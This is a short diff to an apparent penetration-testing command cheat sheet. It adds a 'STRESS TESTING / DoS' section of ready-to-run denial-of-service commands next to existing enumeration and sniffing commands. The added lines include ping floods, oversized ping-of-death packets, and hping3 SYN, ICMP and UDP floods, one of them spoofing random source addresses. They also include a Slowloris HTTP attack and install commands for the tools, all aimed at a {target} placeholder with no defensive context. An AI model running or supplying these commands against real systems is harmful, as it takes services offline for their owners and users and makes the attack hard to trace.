@@ -157,6 +157,19 @@ NFS shares: showmount -e {target}
 RPC info: rpcclient -U "" -N {target}
 Finger users: finger @{target}
 
+=== STRESS TESTING / DoS ===
+Ping flood: sudo ping -f {target}
+Ping of death (oversized): sudo ping -s 65500 -c 100 {target}
+Ping flood with size: sudo ping -f -s 65500 {target}
+Ping flood count: sudo ping -f -c 10000 {target}
+Hping3 SYN flood: sudo hping3 -S --flood -V -p 80 {target}
+Hping3 SYN flood random source: sudo hping3 -S --flood --rand-source -p 80 {target}
+Hping3 ICMP flood: sudo hping3 --icmp --flood {target}
+Hping3 UDP flood: sudo hping3 --udp --flood -p 53 {target}
+Slowloris (HTTP): slowloris {target} -p 80 -s 500
+Install hping3: sudo apt-get install -y hping3
+Install slowloris: sudo pip3 install slowloris
+
 === SNIFFING / MITM ===
 Capture packets: sudo tcpdump -i {iface} -w capture.pcap
 Capture HTTP: sudo tcpdump -i {iface} -A port 80
